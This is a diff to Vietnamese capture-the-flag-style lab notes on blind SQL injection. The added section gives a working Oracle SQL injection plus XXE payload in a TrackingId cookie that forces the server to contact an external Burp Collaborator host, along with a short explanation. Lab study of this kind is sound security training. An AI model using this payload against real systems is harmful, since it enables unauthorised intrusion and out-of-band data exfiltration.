@@ -17,9 +17,19 @@ Vì file đã được ghi đè nằm trong thư mục image
 
 <img width="689" height="71" alt="image" src="https://github.com/user-attachments/assets/a281d86e-2691-4220-a315-a15e391ce8e1" />
 
-# 4. Lab: Blind OS command injection with out-of-band interaction ĐỂ SAU 
+# 4. Lab: Blind OS command injection with out-of-band interaction ĐỂ SAU #
 
-# 5. 
+# 5. Lab: Blind SQL injection with out-of-band interaction #
+Modify TrackingId
+`Cookie: TrackingId=6u3QRuGCVmoF545g'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//xdegid2g6jl31s092vvvk24swj2aq0ep.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--`
+
+Đoạn script sẽ kiểm tra Blind SQL Injection kết hợp XXE trên Oracle Database, nhằm khiến server phát sinh tương tác mạng tới Burp Collaborator. 
+
+Tên miền Collaborator là một định danh duy nhất do Burp tạo ra cho lần kiểm thử.
+Nếu hệ thống thực hiện tương tác tới tên miền đó và sự kiện đến được hạ tầng Collaborator, bạn có thể quan sát nó trong giao diện Burp.
+
+# 6. Lab: Blind SQL injection with out-of-band data exfiltration #
+
 
 
 
